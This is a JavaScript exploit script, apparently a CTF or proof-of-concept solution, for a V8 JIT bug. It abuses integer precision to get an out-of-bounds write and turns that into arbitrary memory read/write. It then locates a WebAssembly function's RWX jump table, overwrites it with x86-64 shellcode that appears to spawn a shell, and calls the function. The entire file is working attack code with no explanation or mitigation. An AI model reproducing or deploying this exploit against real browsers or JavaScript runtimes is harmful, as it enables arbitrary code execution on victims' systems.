let ab = new ArrayBuffer(8);
let farray = new Float64Array(ab);
let uarray = new Uint32Array(ab);
let wasm_code = new Uint8Array([0x0,0x61,0x73,0x6D,0x01,0x0,0x0,0x0,0x01,0x85,0x80,0x80,0x80,0x0,0x01,0x60,0x0,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x0,0x01,0x0,0x04,0x84,0x80,0x80,0x80,0x0,0x01,0x70,0x0,0x0,0x05,0x83,0x80,0x80,0x80,0x0,0x01,0x0,0x01,0x06,0x81,0x80,0x80,0x80,0x0,0x0,0x07,0x91,0x80,0x80,0x80,0x0,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x0,0x04,0x6D,0x61,0x69,0x6E,0x0,0x0,0x0A,0x8A,0x80,0x80,0x80,0x0,0x01,0x84,0x80,0x80,0x80,0x0,0x0,0x41,0x01,0x0B]);
let shellcode = [0xbb48c031, 0x91969dd1, 0xff978cd0, 0x53dbf748, 0x52995f54, 0xb05e5457, 0x50f3b];

function f2i(f) {
	farray[0] = f;
	return [uarray[0],uarray[1]]
}

function i2f(lo,hi) {
	uarray[0] = lo;
	uarray[1] = hi;
	return farray[0];
}

function hex(lo,hi) {
	console.log('0x' + hi.toString(16) + lo.toString(16));
}

function sleep() {
	while(1){continue;}
}

function trigger() {
	return 1;
}

let oarray = undefined;
function vuln(ph) {
	let arr = [1.1,1.2,1.3,1.4,1.5,1.6];
	let arr2 = [2.1,2.2,2.3];
	let i = ph ? 9007199254740992 : 9007199254740989
	i += 1
	i += 1
	i -= 9007199254740991
	i *= 3;
	i += 2;
	arr[i] = i2f(0,1024)
	oarray = arr2;
	return [arr,i]
}

for(var i=0;i<0x10000;i++) {
	let result = vuln(true)
	if((result[1]) == 11) {
		oarray.length = 1024
		break
	}
}

let wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code),{})
let f = wasm_mod.exports.main
let f_arr = [3.1,3.2,f]
let ab2 = new ArrayBuffer(0x100) //bs 0xb6
let dv = new DataView(ab2);

let f_addr = f2i(oarray[173])
hex(f_addr[0]-1,f_addr[1])
oarray[0xb6] = i2f((f_addr[0]-1),f_addr[1]);

let temp = [dv.getUint32(24,true), dv.getUint32(28,true)]; //shared_info
hex(temp[0]-1,temp[1]);
oarray[0xb6] = i2f((temp[0]-1),temp[1]);

temp = [dv.getUint32(8,true), dv.getUint32(12,true)]; //WASM_EXPORTED_FUNCTION_DATA_TYPE 
hex(temp[0]-1,temp[1]);
oarray[0xb6] = i2f((temp[0]-1),temp[1]);

temp = [dv.getUint32(16,true), dv.getUint32(20,true)]; //WASM_INSTANCE_TYPE 
hex(temp[0]-1,temp[1]);
oarray[0xb6] = i2f((temp[0]-1),temp[1]);

temp = [dv.getUint32(248,true), dv.getUint32(252,true)]; //JumpTableStart
hex(temp[0],temp[1]);
oarray[0xb6] = i2f((temp[0]),temp[1]);
let len_save  = [temp[0].toString(16).length,temp[1].toString(16).length];
if(len_save[0] != 8 || len_save[1] != 4)
       throw 'lensave[0] != 8 || lensave[1] != 4';

for(let i=0; i<shellcode.length; i++)
	dv.setUint32(i*4,shellcode[i],true);
//%DebugPrint(f);
f();
//sleep();
